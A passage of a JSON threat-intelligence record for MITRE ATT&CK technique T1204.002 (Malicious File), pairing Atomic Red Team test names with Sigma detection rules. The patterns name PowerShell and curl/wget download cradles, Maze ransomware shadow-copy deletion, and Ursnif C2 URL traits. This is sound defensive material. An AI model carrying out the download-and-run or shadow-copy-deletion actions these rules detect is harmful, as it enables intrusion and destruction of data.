{
    "id": "T1204.002",
    "name": "Malicious File",
    "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](T1566.001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\nAdversaries may employ various forms of [Masquerading](T1036) on the file to increase the likelihood that a user will open it.\nWhile [Malicious File](T1204.002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](T1534).",
    "platforms": "Linux, macOS, Windows",
    "kill_chain_phases": "Execution",
    "data_sources": "Process: Process Creation, File: File Creation",
    "detection": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](T1140) in payloads.\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
    "url": "https://attack.mitre.org/techniques/T1204/002",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1204.002",
                "atomic_attack_guid": "581d7521-9c4b-420e-9695-2aec5241167f",
                "atomic_attack_name": "LNK Payload Download",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PowerShell Web Download",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Suspicious Invoke-WebRequest Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_download.yml",
                        "remote_content": "title: Suspicious Invoke-WebRequest Execution\nid: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc\nrelated:\n    - id: e218595b-bbe7-4ee5-8a96-f32a24ad3468\n      type: derived\nstatus: test\ndescription: Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location\nreferences:\n    - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-02\nmodified: 2024-02-23\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_commands:\n        CommandLine|contains:\n            # These are all aliases of Invoke-WebRequest\n            - 'curl '\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'wget '\n    selection_flags:\n        CommandLine|contains:\n            - ' -ur'\n            - ' -o'\n    selection_susp_locations:\n        CommandLine|contains:\n            - '\\AppData\\'\n            - '\\Desktop\\'\n            - '\\Temp\\'\n            - '\\Users\\Public\\'\n            - '%AppData%'\n            - '%Public%'\n            - '%Temp%'\n            - '%tmp%'\n            - ':\\Windows\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1204.002",
                "atomic_attack_guid": "02f35d62-9fdc-4a97-b899-a5d9a876d295",
                "atomic_attack_name": "Potentially Unwanted Applications (PUA)",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PowerShell Web Download",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Suspicious Invoke-WebRequest Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_download.yml",
                        "remote_content": "title: Suspicious Invoke-WebRequest Execution\nid: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc\nrelated:\n    - id: e218595b-bbe7-4ee5-8a96-f32a24ad3468\n      type: derived\nstatus: test\ndescription: Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location\nreferences:\n    - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-02\nmodified: 2024-02-23\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_commands:\n        CommandLine|contains:\n            # These are all aliases of Invoke-WebRequest\n            - 'curl '\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'wget '\n    selection_flags:\n        CommandLine|contains:\n            - ' -ur'\n            - ' -o'\n    selection_susp_locations:\n        CommandLine|contains:\n            - '\\AppData\\'\n            - '\\Desktop\\'\n            - '\\Temp\\'\n            - '\\Users\\Public\\'\n            - '%AppData%'\n            - '%Public%'\n            - '%Temp%'\n            - '%tmp%'\n            - ':\\Windows\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1204.002",
                "atomic_attack_guid": "3f3af983-118a-4fa1-85d3-ba4daa739d80",
                "atomic_attack_name": "OSTap Payload Download",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potentially Suspicious CMD Shell Output Redirect",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_redirection_susp_folder.yml",
                        "remote_content": "title: Potentially Suspicious CMD Shell Output Redirect\nid: 8e0bb260-d4b2-4fff-bb8d-3f82118e6892\nrelated:\n    - id: aa2efee7-34dd-446e-8a37-40790a66efd7\n      type: derived\n    - id: 4f4eaa9f-5ad4-410c-a4be-bc6132b0175a\n      type: similar\nstatus: test\ndescription: |\n    Detects inline Windows shell commands redirecting output via the \">\" symbol to a suspicious location.\n    This technique is sometimes used by malicious actors in order to redirect the output of reconnaissance commands such as \"hostname\" and \"dir\" to files for future exfiltration.\nreferences:\n    - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-12\nmodified: 2024-03-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli_1:\n        CommandLine|contains:\n            # Note: Add more suspicious locations as you find them\n            # Note: The space from the start is missing to cover append operations \">>\"\n            # Note: We use the \"?\" to account for both a single and a double quote\n            # Note: If you want to account for more spaces which is still a valid bypass option. Use a regex with \"\\s\"\n            - '>?%APPDATA%\\'\n            - '>?%TEMP%\\'\n            - '>?%TMP%\\'\n            - '>?%USERPROFILE%\\'\n            - '>?C:\\ProgramData\\'\n            - '>?C:\\Temp\\'\n            - '>?C:\\Users\\Public\\'\n            - '>?C:\\Windows\\Temp\\'\n    selection_cli_2:\n        CommandLine|contains:\n            - ' >'\n            - '\">'\n            - \"'>\"\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\'\n    condition: selection_img and 1 of selection_cli_*\nfalsepositives:\n    - Legitimate admin or third party scripts used for diagnostic collection might generate some false positives\nlevel: medium\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                    "932ac737-33ca-4afd-9869-0d48b391fcc9",
                    "29fd07fc-9cfd-4331-b7fd-cc18dfa21052",
                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                    "d13c43f0-f66b-4279-8b2c-5912077c1780",
                    "438025f9-5856-4663-83f7-52f878a70a50",
                    "7417e29e-c2e7-4cf6-a2e8-767228c64837",
                    "b5de2919-b74a-4805-91a7-5049accbaefe",
                    "c7a74c80-ba5a-486e-9974-ab9e682bc5e4",
                    "8a582fe2-0882-4b89-a82a-da6b2dc32937",
                    "ff0f2b05-09db-4095-b96d-1b75ca24894a",
                    "7bdde3bf-2a42-4c39-aa31-a92b3e17afac",
                    "69483748-1525-4a6c-95ca-90dc8d431b68",
                    "23daeb52-e6eb-493c-8607-c4f0246cb7d8",
                    "232b7f21-adf9-4b42-b936-b9d6f7df856e",
                    "518643ba-7d9c-4fa5-9f37-baed36059f6a",
                    "e6ce8457-68b1-485b-9bdd-3c2b5d679aa9",
                    "aa3a6f94-890e-4e22-b634-ffdfd54792cc",
                    "864403a1-36c9-40a2-a982-4c9a45f7d833",
                    "d8c0c469-2d3e-437a-80a1-a38bfe5998e8",
                    "90217a70-13fc-48e4-b3db-0d836c5824ac",
                    "00d0b5ab-1f55-4120-8e83-487c0a7baf19",
                    "a2a3b925-7bb0-433b-b508-db9003263cc4",
                    "678eb5f4-8597-4be6-8be7-905e4234b53a",
                    "60936b49-fca0-4f32-993d-7415edcf9a5d",
                    "4922a5dd-6743-4fc2-8e81-144374280997",
                    "7a4afb4a-3eb1-4966-9c25-7e1ce2b1eb74",
                    "208748f7-881d-47ac-a29c-07ea84bf691d",
                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                    "fdd84c68-a1f6-47c9-9477-920584f94905",
                    "e1693bc8-7168-4eab-8718-cdcaa68a1738",
                    "04f5363a-6bca-42ff-be70-0d28bf629ead"
                ],
                "lookup_results": [
                    {
                        "uuid": "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                        "lookup_data": {
                            "description": "Detect run not allowed files. Applocker is a very useful tool, especially on servers where unprivileged users have access. For example terminal servers. You need configure applocker and log collect to receive these events.",
                            "raw": "author: Pushkarev Dmitry\ndate: 2020/06/28\ndescription: Detect run not allowed files. Applocker is a very useful tool, especially\n  on servers where unprivileged users have access. For example terminal servers. You\n  need configure applocker and log collect to receive these events.\ndetection:\n  condition: selection\n  selection:\n    EventID:\n    - 8004\n    - 8007\n    - 8022\n    - 8025\nfalsepositives:\n- Need tuning applocker or add exceptions in SIEM\nfields:\n- PolicyName\n- RuleId\n- RuleName\n- TargetUser\n- TargetProcessId\n- FilePath\n- FileHash\n- Fqbn\nid: 401e5d00-b944-11ea-8f9a-00163ecd60ae\nlevel: medium\nlogsource:\n  product: windows\n  service: applocker\nmodified: 2021/11/27\nreferences:\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/using-event-viewer-with-applocker\n- https://nxlog.co/documentation/nxlog-user-guide/applocker.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\n- attack.t1059.001\n- attack.t1059.003\n- attack.t1059.005\n- attack.t1059.006\n- attack.t1059.007\ntitle: File Was Not Allowed To Run\n",
                            "sigma:id": "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                            "title": "File Was Not Allowed To Run",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "932ac737-33ca-4afd-9869-0d48b391fcc9",
                        "lookup_data": {
                            "description": "Detects Ursnif C2 traffic.",
                            "raw": "author: Thomas Patzke\ndate: 2019/12/19\ndescription: Detects Ursnif C2 traffic.\ndetection:\n  b64encoding:\n    c-uri|contains:\n    - _2f\n    - _2b\n  condition: b64encoding and urlpatterns\n  urlpatterns:\n    c-uri|contains|all:\n    - .avi\n    - /images/\nfalsepositives:\n- Unknown\nfields:\n- c-ip\n- c-uri\n- sc-bytes\n- c-ua\nid: 932ac737-33ca-4afd-9869-0d48b391fcc9\nlevel: critical\nlogsource:\n  category: proxy\nmodified: 2021/08/09\nreferences:\n- https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html\nstatus: stable\ntags:\n- attack.initial_access\n- attack.t1566.001\n- attack.execution\n- attack.t1204.002\n- attack.command_and_control\n- attack.t1071.001\ntitle: Ursnif Malware C2 URL Pattern\n",
                            "sigma:id": "932ac737-33ca-4afd-9869-0d48b391fcc9",
                            "title": "Ursnif Malware C2 URL Pattern",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "29fd07fc-9cfd-4331-b7fd-cc18dfa21052",
                        "lookup_data": {
                            "description": "Detects specific process characteristics of Maze ransomware word document droppers",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/05/08\ndescription: Detects specific process characteristics of Maze ransomware word document\n  droppers\ndetection:\n  condition: 1 of selection*\n  selection1:\n    Image|endswith: .tmp\n    ParentImage|endswith: \\WINWORD.exe\n  selection2:\n    CommandLine|endswith: shadowcopy delete\n    Image|endswith: \\wmic.exe\n    ParentImage|contains: \\Temp\\\n  selection3:\n    CommandLine|contains: \\..\\..\\system32\n    CommandLine|endswith: shadowcopy delete\nfalsepositives:\n- Unlikely\nfields:\n- ComputerName\n- User\n- Image\nid: 29fd07fc-9cfd-4331-b7fd-cc18dfa21052\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/06/27\nreferences:\n- https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html\n- https://app.any.run/tasks/51e7185c-52d7-4efb-ac0d-e86340053473/\n- https://app.any.run/tasks/65a79440-373a-4725-8d74-77db9f2abda4/\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\n- attack.t1047\n- attack.impact\n- attack.t1490\ntitle: Maze Ransomware\n",
                            "sigma:id": "29fd07fc-9cfd-4331-b7fd-cc18dfa21052",
                            "title": "Maze Ransomware",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                        "lookup_data": {
                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1663580963",
                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d13c43f0-f66b-4279-8b2c-5912077c1780",
                        "lookup_data": {
                            "description": "Detects CLR DLL being loaded by an Office Product",
                            "raw": "author: Antonlovesdnb\ndate: 2020/02/19\ndescription: Detects CLR DLL being loaded by an Office Product\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|contains: \\clr.dll\n    Image|endswith:\n    - \\winword.exe\n    - \\powerpnt.exe\n    - \\excel.exe\n    - \\outlook.exe\nfalsepositives:\n- Alerts on legitimate macro usage as well, will need to filter as appropriate\nid: d13c43f0-f66b-4279-8b2c-5912077c1780\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\ntitle: CLR DLL Loaded Via Office Applications\n",
                            "sigma:id": "d13c43f0-f66b-4279-8b2c-5912077c1780",
                            "title": "CLR DLL Loaded Via Office Applications",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "438025f9-5856-4663-83f7-52f878a70a50",
                        "lookup_data": {
                            "description": "Detects a Windows command and scripting interpreter executable started from Microsoft Word, Excel, Powerpoint, Publisher and Visio",
                            "raw": "author: Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye\n  Team\ndate: 2018/04/06\ndescription: Detects a Windows command and scripting interpreter executable started\n  from Microsoft Word, Excel, Powerpoint, Publisher and Visio\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\sh.exe\n    - \\bash.exe\n    - \\scrcons.exe\n    - \\schtasks.exe\n    - \\regsvr32.exe\n    - \\hh.exe\n    - \\wmic.exe\n    - \\mshta.exe\n    - \\rundll32.exe\n    - \\msiexec.exe\n    - \\forfiles.exe\n    - \\scriptrunner.exe\n    - \\mftrace.exe\n    - \\AppVLP.exe\n    - \\svchost.exe\n    - \\msbuild.exe\n    ParentImage|endswith:\n    - \\WINWORD.EXE\n    - \\EXCEL.EXE\n    - \\POWERPNT.exe\n    - \\MSPUB.exe\n    - \\VISIO.exe\n    - \\MSACCESS.EXE\n    - \\EQNEDT32.EXE\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 438025f9-5856-4663-83f7-52f878a70a50\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n- https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\ntitle: Microsoft Office Product Spawning Windows Shell\n",
                            "sigma:id": "438025f9-5856-4663-83f7-52f878a70a50",
                            "title": "Microsoft Office Product Spawning Windows Shell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7417e29e-c2e7-4cf6-a2e8-767228c64837",
                        "lookup_data": {
                            "description": "Detects Kerberos DLL being loaded by an Office Product",
                            "raw": "author: Antonlovesdnb\ndate: 2020/02/19\ndescription: Detects Kerberos DLL being loaded by an Office Product\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|endswith: \\kerberos.dll\n    Image|endswith:\n    - \\winword.exe\n    - \\powerpnt.exe\n    - \\excel.exe\n    - \\outlook.exe\nfalsepositives:\n- Alerts on legitimate macro usage as well, will need to filter as appropriate\nid: 7417e29e-c2e7-4cf6-a2e8-767228c64837\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\ntitle: Active Directory Kerberos DLL Loaded Via Office Applications\n",
                            "sigma:id": "7417e29e-c2e7-4cf6-a2e8-767228c64837",
                            "title": "Active Directory Kerberos DLL Loaded Via Office Applications",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b5de2919-b74a-4805-91a7-5049accbaefe",
                        "lookup_data": {
                            "description": "Detects executable downloads from suspicious remote systems",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/13\ndescription: Detects executable downloads from suspicious remote systems\ndetection:\n  condition: selection and not filter\n  filter:\n    r-dns|endswith:\n    - .com\n    - .org\n    - .net\n    - .edu\n    - .gov\n    - .uk\n    - .ca\n    - .de\n    - .jp\n    - .fr\n    - .au\n    - .us\n    - .ch\n    - .it\n    - .nl\n    - .se\n    - .no\n    - .es\n  selection:\n    c-uri-extension:\n    - exe\n    - vbs\n    - bat\n    - rar\n    - ps1\n    - doc\n    - docm\n    - xls\n    - xlsm\n    - pptm\n    - rtf\n    - hta\n    - dll\n    - ws\n    - wsf\n    - sct\n    - zip\nfalsepositives:\n- All kind of software downloads\nfields:\n- ClientIP\n- c-uri\nid: b5de2919-b74a-4805-91a7-5049accbaefe\nlevel: low\nlogsource:\n  category: proxy\nmodified: 2023/01/09\nrelated:\n- id: 00d0b5ab-1f55-4120-8e83-487c0a7baf19\n  type: similar\nstatus: test\ntags:\n- attack.initial_access\n- attack.t1566\n- attack.execution\n- attack.t1203\n- attack.t1204.002\ntitle: Download From Suspicious TLD - Whitelist\n",
                            "sigma:id": "b5de2919-b74a-4805-91a7-5049accbaefe",
                            "title": "Download From Suspicious TLD - Whitelist",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c7a74c80-ba5a-486e-9974-ab9e682bc5e4",
                        "lookup_data": {
                            "description": "This rule will monitor executable and script file creation by office applications. Please add more file extensions or magic bytes to the logic of your choice.",
                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\ndate: 2021/08/23\ndescription: This rule will monitor executable and script file creation by office\n  applications. Please add more file extensions or magic bytes to the logic of your\n  choice.\ndetection:\n  condition: all of selection* and not 1 of filter_*\n  filter_localassembly:\n    TargetFilename|contains: \\AppData\\Local\\assembly\\tmp\\\n    TargetFilename|endswith: .dll\n  filter_webex:\n    Image|endswith: \\winword.exe\n    TargetFilename|contains: \\AppData\\Local\\Temp\\webexdelta\\\n    TargetFilename|endswith:\n    - .dll\n    - .exe\n  filter_webservicecache:\n    TargetFilename|contains|all:\n    - C:\\Users\\\n    - \\AppData\\Local\\Microsoft\\Office\\\n    - \\WebServiceCache\\AllUsers\n    TargetFilename|endswith: .com\n  selection1:\n    Image|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n  selection2:\n    TargetFilename|endswith:\n    - .exe\n    - .dll\n    - .ocx\n    - .com\n    - .ps1\n    - .vbs\n    - .sys\n    - .bat\n    - .scr\n    - .proj\nfalsepositives:\n- Unknown\nid: c7a74c80-ba5a-486e-9974-ab9e682bc5e4\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/07/11\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\nstatus: experimental\ntags:\n- attack.t1204.002\n- attack.execution\ntitle: Created Files by Office Applications\n",
                            "sigma:id": "c7a74c80-ba5a-486e-9974-ab9e682bc5e4",
                            "title": "Created Files by Office Applications",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
                        "lookup_data": {
                            "description": "Detects suspicious and uncommon child processes of WmiPrvSE",
                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng\ndate: 2021/08/23\ndescription: Detects suspicious and uncommon child processes of WmiPrvSE\ndetection:\n  condition: selection_parent and 1 of selection_children_*\n  selection_children_1:\n    Image|endswith:\n    - \\regsvr32.exe\n    - \\rundll32.exe\n    - \\msiexec.exe\n    - \\mshta.exe\n    - \\verclsid.exe\n  selection_children_2:\n    CommandLine|contains:\n    - powershell\n    - pwsh\n    - mshta\n    - rundll32\n    - regsvr32\n    - wscript\n    - cscript\n    Image|endswith: \\cmd.exe\n  selection_parent:\n    ParentImage|endswith: \\wbem\\WmiPrvSE.exe\nfalsepositives:\n- Unknown\nid: 8a582fe2-0882-4b89-a82a-da6b2dc32937\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\n- https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/\nrelated:\n- id: 692f0bec-83ba-4d04-af7e-e884a96059b6\n  type: similar\n- id: d21374ff-f574-44a7-9998-4a8c8bf33d7d\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1047\n- attack.t1204.002\n- attack.t1218.010\ntitle: Suspicious WmiPrvse Child Process Spawned\n",
                            "sigma:id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
                            "title": "Suspicious WmiPrvse Child Process Spawned",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ff0f2b05-09db-4095-b96d-1b75ca24894a",
                        "lookup_data": {
                            "description": "Detects any assembly DLL being loaded by an Office Product",
